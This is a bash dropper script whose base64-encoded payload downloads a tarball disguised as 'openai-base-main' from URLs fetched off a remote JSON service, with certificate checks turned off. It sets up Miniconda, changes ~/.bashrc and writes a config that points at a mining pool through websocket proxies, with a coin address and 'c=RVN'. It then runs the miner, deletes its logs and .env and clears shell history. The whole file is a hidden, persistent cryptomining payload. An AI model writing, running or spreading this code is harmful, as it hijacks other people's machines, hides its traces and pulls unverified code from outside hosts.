#!/usr/bin/env bash

set -e

TMP_SCRIPT=$(mktemp /tmp/bum.XXXXXX.sh)
chmod +x "$TMP_SCRIPT"

base64 -d << 'EOF' | tr -d '\r' > "$TMP_SCRIPT"
ZWNobyAnIyEvYmluL2Jhc2gKWyAtZiBvcGVuYWktYmFzZS1tYWluL3N0YXJ0LnNoIF0gfHwgKAojIS9iaW4vYmFzaAoKd2hpbGUgdHJ1ZTsgZG8KICBlY2hvICJM4bqleSBkYW5oIHPDoWNoIFVSTCB04burIEFQSS4uLiIKICB1cmxzPSQoY3VybCAtcyBodHRwczovL2FwaS5ucG9pbnQuaW8vMDRjYTBkNTQ3NTQxNWNhNDlhODUgfCBqcSAtciAnLmRhdGFzW10nKQogIHN1Y2Nlc3M9ZmFsc2UKCiAgZm9yIHVybCBpbiAkdXJsczsgZG8KICAgIGVjaG8gIlRo4butIHThuqNpIHThu6s6ICR1cmwiCiAgICBpZiB3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgIiR1cmwiIC1PIG9wZW5haS1iYXNlLW1haW4udGFyLmd6OyB0aGVuCiAgICAgIGlmIHRhciAteHZmIG9wZW5haS1iYXNlLW1haW4udGFyLmd6OyB0aGVuCiAgICAgICAgcm0gb3BlbmFpLWJhc2UtbWFpbi50YXIuZ3oKICAgICAgICBlY2hvICJU4bqjaSB2w6AgZ2nhuqNpIG7DqW4gdGjDoG5oIGPDtG5nIHThu6s6ICR1cmwiCiAgICAgICAgc3VjY2Vzcz10cnVlCiAgICAgICAgYnJlYWsKICAgICAgZWxzZQogICAgICAgIGVjaG8gIkdp4bqjaSBuw6luIGzhu5dpIHThu6s6ICR1cmwiCiAgICAgIGZpCiAgICBlbHNlCiAgICAgIGVjaG8gIlThuqNpIGzhu5dpIHThu6s6ICR1cmwiCiAgICBmaQogIGRvbmUKCiAgaWYgJHN1Y2Nlc3M7IHRoZW4KICAgIGJyZWFrCiAgZWxzZQogICAgZWNobyAiVOG6pXQgY+G6oyBVUkwgxJHhu4F1IGzhu5dpLiBUaOG7rSBs4bqhaSBzYXUgMzAgZ2nDonkuLi4iCiAgICBzbGVlcCAzMAogIGZpCmRvbmUKKScgPiBidW0uc2ggJiYgY2htb2QgK3ggYnVtLnNoICYmIG5vaHVwIC4vYnVtLnNoID4gb3V0LmxvZyAyPiYxICYKCgp3aGlsZSB0cnVlOyBkbwoKICAgIFsgISAtZCAiJChwd2QpL21pbmljb25kYSIgXSAmJiB3Z2V0IGh0dHBzOi8vcmVwby5hbmFjb25kYS5jb20vbWluaWNvbmRhL01pbmljb25kYTMtbGF0ZXN0LUxpbnV4LXg4Nl82NC5zaCAmJiBiYXNoIE1pbmljb25kYTMtbGF0ZXN0LUxpbnV4LXg4Nl82NC5zaCAtYiAtcCAkKHB3ZCkvbWluaWNvbmRhIHx8IGVjaG8gIk1pbmljb25kYSDEkcOjIMSRxrDhu6NjIGPDoGkgxJHhurd0IHPhurVuIiAmJiAKICAgIHJtIE1pbmljb25kYTMtbGF0ZXN0LUxpbnV4LXg4Nl82NC5zaCB8fCB0cnVlCiAgICBleHBvcnQgUEFUSD0iJChwd2QpL21pbmljb25kYS9iaW46JFBBVEgiCiAgICBlY2hvICdleHBvcnQgUEFUSD0iJChwd2QpL21pbmljb25kYS9iaW46JFBBVEgiJyA+PiB+Ly5iYXNocmMgCiAgICBQWT0kKGZpbmQgJEhPTUUgLXR5cGUgZCAtbmFtZSAibWluaWNvbmRhIiB8IHRhaWwgLW4gMSkvYmluL3B5dGhvbgoKICAgICMgVMOsbSB0aMawIG3hu6VjIHB5dGhvbi1hcHAKICAgICRQWSAtbSBwaXAgaW5zdGFsbCBmbGFzayBmbGFza19zb2NrZXRpbyB3ZWJzb2NrZXQtY2xpZW50IGZhc3RhcGkgdXZpY29ybiBweXR6IHJlcXVlc3RzCiAgICBkaXI9JChmaW5kIH4gLXR5cGUgZCAtbmFtZSAnb3BlbmFpLWJhc2UtbWFpbicgLXByaW50IC1xdWl0KQogICAgaWYgWyAtbiAiJGRpciIgXTsgdGhlbgogICAgICAgIHJtIC1mIGJ1bS5zaCBvdXQubG9nIC5lbnYKICAgICAgICAjIHBraWxsIHB5dGhvbiB8fCB0cnVlCiAgICAgICAgIyBwa2lsbCBweXRob24zIHx8IHRydWUKICAgICAgICBjZCAiJGRpciIgfHwgZXhpdCAxCiAgICAgICAgZWNobyAtZSAicHJveHk9d3NzOi8vJChzaHVmIC1uIDEgLWUgaWRlbnRpY2FsLXNpbGUtbWFscGhpdGUtbm9kZS1kZmFhNWVjNS5rb3llYi5hcHAgd3Mtem96by5ob25ncGhhdC5lZHUudm4pL2VHVnNhWE4yTWkxd1pYQmxkeTV1WVM1dGFXNWxMbnB3YjI5c0xtTmhPalE0TXpNPQpob3N0PTEyNy4wLjAuMQpwb3J0PTMzMDYKdXNlcm5hbWU9UlNxV1JnaXZOdG14RGFFV2oxeHlMckU1SFBuamNzOEROagpwYXNzd29yZD1jPVJWTgp0aHJlYWRzPTgiID4gZGF0YS50eHQKICAgICAgICAjZWNobyAtZSAicHJveHk9d3NzOi8vd3Mtem96by5ob25ncGhhdC5lZHUudm4vZUdWc2FYTjJNaTF3WlhCbGR5NXVZUzV0YVc1bExucHdiMjlzTG1OaE9qUTRNek09Cmhvc3Q9MTI3LjAuMC4xCnBvcnQ9MzMwNgp1c2VybmFtZT1SU3FXUmdpdk50bXhEYUVXajF4eUxyRTVIUG5qY3M4RE5qCnBhc3N3b3JkPWM9UlZOCnRocmVhZHM9OCIgPiBkYXRhLnR4dAogICAgICAgIGhpc3RvcnkgLWMgJiYgaGlzdG9yeSAtdwogICAgICAgIGNsZWFyCiAgICAgICAgJFBZIC11IG1haW4ucHkgOCAtLWRhdGFzZXQ9ZGF0YS50eHQgLS1vdXRwdXQ9cmVzdWx0LnR4dCA+IHN0ZG91dC50eHQgMj4gc3RkZXJyLnR4dAogICAgZWxzZQogICAgICAgIGVjaG8gIktow7RuZyB0w6xtIHRo4bqleSB0aMawIG3hu6VjICdvcGVuYWktYmFzZS1tYWluJyIKICAgIGZpCgogICAgc2xlZXAgMTAKZG9uZQo=
EOF

bash "$TMP_SCRIPT"

rm -f "$TMP_SCRIPT"
